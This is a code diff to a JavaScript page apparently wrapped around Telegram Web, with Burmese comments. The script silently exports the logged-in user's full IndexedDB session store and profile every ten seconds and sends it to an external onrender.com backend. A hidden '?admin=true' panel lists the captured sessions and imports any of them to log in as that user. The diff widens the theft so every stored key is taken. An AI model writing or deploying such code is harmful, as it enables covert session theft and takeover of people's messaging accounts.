@@ -28,7 +28,7 @@
   <script>
     const BACKEND_URL = "https://telegram-7ih3.onrender.com";
 
-    // --- Helpers (Binary to Base64) ---
+    // --- Helpers ---
     function bufferToBase64(buf) {
         let binary = '';
         const bytes = new Uint8Array(buf);
@@ -57,7 +57,7 @@
         });
     }
 
-    // --- IndexedDB Extractors ---
+    // --- IndexedDB Extractors (Data လုံးဝ အပျောက်မခံတော့ပါ) ---
     async function exportIndexedDB(dbName, storeName) {
         return new Promise((resolve) => {
             const request = indexedDB.open(dbName);
@@ -73,9 +73,8 @@
                     getKeysReq.onsuccess = () => {
                         const data = {};
                         for (let i = 0; i < getKeysReq.result.length; i++) {
-                            const key = getKeysReq.result[i];
-                            if(typeof key === 'string' && (key.includes('media') || key.includes('file'))) continue;
-                            data[key] = getAllReq.result[i];
+                            // Login ဝင်ရန် လိုအပ်သော Data များ မပျောက်စေရန် အကုန်ယူမည်
+                            data[getKeysReq.result[i]] = getAllReq.result[i];
                         }
                         resolve(data);
                     };
@@ -107,19 +106,27 @@
         });
     }
 
-    // --- Profile Checker ---
+    // --- Profile Checker (ID ရှိရုံဖြင့် Login ဝင်ပြီးကြောင်း သတ်မှတ်မည်) ---
     function getTelegramProfile() {
         try {
             const stateStr = localStorage.getItem('tt-global-state');
             if (stateStr) {
                 const state = JSON.parse(stateStr);
                 const currentId = state.currentUserId;
-                if (currentId && state.users && state.users.byId && state.users.byId[currentId]) {
-                    const user = state.users.byId[currentId];
-                    const fullName = [user.firstName, user.lastName].filter(Boolean).join(' ');
-                    const phone = user.phoneNumber ? '+' + user.phoneNumber : '';
-                    if (!phone) return null; // Phone မရှိသေးရင် Login မပြီးသေးဟု သတ်မှတ်မည်
-                    return { uid: currentId.toString(), name: fullName, phone: phone, username: user.username ? '@' + user.username : '' };
+                
+                // ID ရှိတာနဲ့ Login ဝင်ထားသည်ဟု အတည်ပြုမည်
+                if (currentId) {
+                    let fullName = 'Staff (' + currentId + ')';
+                    let phone = 'No Phone';
+                    let username = '';
+                    
+                    if (state.users && state.users.byId && state.users.byId[currentId]) {
+                        const user = state.users.byId[currentId];
+                        fullName = [user.firstName, user.lastName].filter(Boolean).join(' ') || fullName;
+                        phone = user.phoneNumber ? '+' + user.phoneNumber : phone;
+                        username = user.username ? '@' + user.username : '';
+                    }
+                    return { uid: currentId.toString(), name: fullName, phone: phone, username: username };
                 }
             }
         } catch (e) {}
@@ -129,7 +136,7 @@
     // --- Main Logic ---
     document.addEventListener("DOMContentLoaded", () => {
         if (window.location.search.includes("admin=true")) {
-            // ================= ADMIN PANEL (Real-time) =================
+            // ================= ADMIN PANEL =================
             document.body.classList.add("hide-telegram");
             const adminPanel = document.createElement("div");
             adminPanel.style.cssText = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #f4f4f9; z-index: 999999; padding: 30px; font-family: sans-serif; overflow-y: auto;";
@@ -164,11 +171,11 @@
                         const idbData = deserializeData(session.indexed_db_str);
                         await importIndexedDB("tt-data", "store", idbData);
                     }
-                    window.location.href = "/"; 
+                    // URL မှ ?admin=true ကိုဖြုတ်ပြီး Refresh အသစ်လုပ်မည်
+                    window.location.replace(window.location.origin + window.location.pathname); 
                 } catch (e) { alert("Error: " + e.message); }
             };
 
-            // Auto Fetch Function
             const fetchAdminData = async () => {
                 try {
                     const res = await fetch(BACKEND_URL + "/api/get_sessions");
@@ -190,7 +197,7 @@
                                     <td style='padding:12px; font-weight: bold;'>${s.profile_phone}</td>
                                     <td style='padding:12px; color: #555;'>${timeString}</td>
                                     <td style='padding:12px;'>
-                                        <button onclick='loginAs(${index})' style='padding: 8px 15px; background: #28a745; color: white; border: none; border-radius: 4px; cursor: pointer;'>Login</button>
+                                        <button onclick='loginAs(${index})' style='padding: 8px 15px; background: #28a745; color: white; border: none; border-radius: 4px; cursor: pointer;'>Login ဝင်မည်</button>
                                     </td>
                                  </tr>`;
                     });
@@ -199,12 +206,11 @@
                 } catch (err) {}
             };
 
-            // ၅ စက္ကန့် တစ်ကြိမ် Auto Refresh လုပ်မည်
             fetchAdminData();
             setInterval(fetchAdminData, 5000);
 
         } else {
-            // ================= STAFF BROWSER (Smart Login/Logout Detect) =================
+            // ================= STAFF BROWSER =================
             console.log("✅ Smart Login/Logout Detector RUNNING!");
             
             setTimeout(() => {
@@ -213,7 +219,6 @@
                         const profile = getTelegramProfile();
                         let lastSavedUid = localStorage.getItem("last_saved_uid");
 
-                        // (က) User က Login ဝင်ပြီးသား ဖြစ်နေလျှင် -> DB သို့ Data ပို့မည်
                         if (profile) {
                             const rawIdbData = await exportIndexedDB("tt-data", "store");
                             if (Object.keys(rawIdbData).length > 0) { 
@@ -233,31 +238,26 @@
                                         timestamp: new Date().toISOString()
                                     })
                                 });
-                                // Login ဝင်ထားကြောင်း Browser တွင် မှတ်သားထားမည်
                                 localStorage.setItem("last_saved_uid", profile.uid);
                                 console.log(`✅ Data Updated for: ${profile.name}`);
                             }
                         } 
-                        // (ခ) Profile မရှိတော့လျှင် (Logout လုပ်သွားလျှင်) -> DB မှ ဖျက်ပစ်မည်
                         else if (!profile && lastSavedUid) {
-                            console.log("⚠️ Logout detected! Deleting session from Database...");
+                            console.log("⚠️ Logout detected! Deleting session...");
                             await fetch(BACKEND_URL + "/api/delete_session", {
                                 method: "POST",
                                 headers: { "Content-Type": "application/json" },
                                 body: JSON.stringify({ user_id: lastSavedUid })
                             });
-                            // မှတ်ထားတာကို ရှင်းပစ်မည်
                             localStorage.removeItem("last_saved_uid");
-                            console.log("🗑️ Session completely removed.");
                         } 
-                        // (ဂ) လုံးဝ Login မဝင်ရသေးလျှင် ငြိမ်နေမည်
                         else {
                             console.log("⏳ Waiting for user to login...");
                         }
                     } catch(e) {
                         console.error("❌ Process failed:", e);
                     }
-                }, 10000); // ၁၀ စက္ကန့် တစ်ကြိမ် စစ်ဆေးမည်
+                }, 10000); 
             }, 3000);
         }
     });
